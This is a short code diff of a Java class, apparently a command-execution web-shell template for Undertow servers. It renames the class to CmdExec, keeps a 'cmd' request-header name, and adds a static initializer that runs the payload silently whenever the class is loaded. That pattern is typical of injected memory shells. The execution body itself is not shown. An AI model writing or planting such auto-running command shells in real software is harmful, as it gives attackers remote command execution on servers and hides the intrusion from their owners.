@@ -8,13 +8,20 @@ import java.lang.reflect.InvocationTargetException;
 import java.lang.reflect.Method;
 import java.util.Scanner;
 
-public class UndertowCmdExecTpl {
+public class CmdExec
+{
     private String getReqHeaderName() {
         return "cmd";
     }
 
+    static {
+        try {
+            new CmdExec();
+        } catch (Exception e) {
+        }
+    }
 
-    public UndertowCmdExecTpl(){
+    public CmdExec(){
         run();
     }
 
